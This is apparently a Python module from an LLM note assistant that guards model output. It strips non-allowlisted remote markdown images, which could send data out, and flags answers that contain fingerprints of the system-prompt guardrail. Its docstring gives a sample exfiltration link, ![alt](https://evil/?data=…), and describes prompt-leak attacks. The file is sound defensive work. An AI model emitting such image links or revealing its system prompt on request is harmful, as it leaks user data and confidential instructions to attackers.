"""L4 输出治理：远程图片中和 + system prompt 泄露指纹（设计文档 §4-L4）。

远程图片中和（S8 外泄通道）：
    答案里的 ``![alt](https://evil/?data=…)`` 会被前端渲染时自动拉取——无需点击即外泄。
    ``/assets/`` 相对路径（自家资产端点）恒白名单；其余远程图片降级为纯文本标注。
    普通超链接保留（需点击，风险低）。

泄露指纹：
    取安全护栏条款的若干 16 字子串作指纹，答案命中说明 system 提示被诱导输出——
    记审计日志（flag），为后续可选的「安全拒绝模板」留钩子。
"""
from __future__ import annotations

import logging
import re
from typing import List, Tuple
from urllib.parse import urlparse

from note_assistant.config import settings
from note_assistant.security.guardrails import SECURITY_GUARDRAIL

logger = logging.getLogger(__name__)

# markdown 远程图片：![alt](http(s)://url)；相对路径（/assets/…）不匹配，天然豁免
_REMOTE_IMG_RE = re.compile(r"!\[([^\]]*)\]\((https?://[^)\s]+)\)")

# 泄露指纹：护栏条款的 16 字切片（最可能被整段套出来的部分）
_FINGERPRINT_LEN = 16
_PROMPT_FINGERPRINTS: List[str] = [
    SECURITY_GUARDRAIL[i : i + _FINGERPRINT_LEN]
    for i in range(0, max(0, len(SECURITY_GUARDRAIL) - _FINGERPRINT_LEN + 1), _FINGERPRINT_LEN)
]


def _media_guard_enabled() -> bool:
    return (
        bool(settings.output_guard_enabled)
        and settings.output_guard_remote_media == "neutralize"
    )


def _host_allowed(host: str) -> bool:
    return host in (settings.output_guard_media_allowlist or [])


def neutralize_remote_media(answer: str) -> Tuple[str, int]:
    """把答案中非白名单的远程图片降级为纯文本标注，返回 ``(处理后文本, 中和数)``。

    /assets/ 相对路径不匹配远程图片正则，P2 补图/标记替换结果永不被误伤。
    """
    if not answer or not _media_guard_enabled():
        return answer, 0

    hits = 0

    def _repl(m: re.Match) -> str:
        nonlocal hits
        url = m.group(2)
        host = (urlparse(url).hostname or "").lower()
        if host and _host_allowed(host):
            return m.group(0)
        hits += 1
        logger.warning(
            "security.output_guard_remote_media",
            extra={"host": host, "action": "neutralized"},
        )
        return f"[远程图片已中和：{host or '未知来源'}]"

    return _REMOTE_IMG_RE.sub(_repl, answer), hits


def check_prompt_leakage(answer: str) -> List[str]:
    """检测答案是否包含 system 护栏条款指纹；返回命中的指纹列表（仅审计）。"""
    if not answer or not settings.output_guard_enabled:
        return []
    leaked = [fp for fp in _PROMPT_FINGERPRINTS if fp in answer]
    if leaked:
        logger.warning(
            "security.output_guard_prompt_leak",
            extra={"fingerprints": len(leaked)},
        )
    return leaked


class RemoteMediaStreamer:
    """流式版远程图片中和：边流边缓冲 ``![…](…)`` 语法，闭合后判定中和或放行。

    与 ImageMarkerStreamer 同构的 feed/flush 协议；守卫关闭时零开销透传。
    非远程图片（如 ``![t](/assets/id)``、``![t](local.png)``）正则不匹配，原样放行。
    """

    _MAX_BUFFER = 600  # 防御无闭合的 "![…"：超限即放行，绝不无限缓冲

    def __init__(self):
        self._buf = ""

    def feed(self, token: str) -> str:
        if not token:
            return ""
        if not _media_guard_enabled():
            return token  # 零开销透传
        self._buf += token
        out: List[str] = []
        while True:
            start = self._buf.find("![")
            if start == -1:
                # 末尾可能是半个 "![" 前缀，留 1 字符继续观察
                hold = 1 if self._buf.endswith("!") else 0
                cut = len(self._buf) - hold
                out.append(self._buf[:cut])
                self._buf = self._buf[cut:]
                break
            out.append(self._buf[:start])
            self._buf = self._buf[start:]
            m = _REMOTE_IMG_RE.match(self._buf)
            if m:
                url = m.group(2)
                host = (urlparse(url).hostname or "").lower()
                if host and _host_allowed(host):
                    out.append(m.group(0))
                else:
                    logger.warning(
                        "security.output_guard_remote_media",
                        extra={"host": host, "action": "neutralized", "stream": True},
                    )
                    out.append(f"[远程图片已中和：{host or '未知来源'}]")
                self._buf = self._buf[m.end():]
                continue
            if ")" in self._buf:
                # 语法已闭合但不是远程图片 → 吐出 "![" 继续扫描其余部分
                out.append(self._buf[:2])
                self._buf = self._buf[2:]
                continue
            if len(self._buf) > self._MAX_BUFFER:
                out.append(self._buf[:2])
                self._buf = self._buf[2:]
                continue
            break  # 未闭合，等后续 token
        return "".join(out)

    def flush(self) -> str:
        """流结束：未闭合的残留原样吐出。"""
        rest, self._buf = self._buf, ""
        return rest
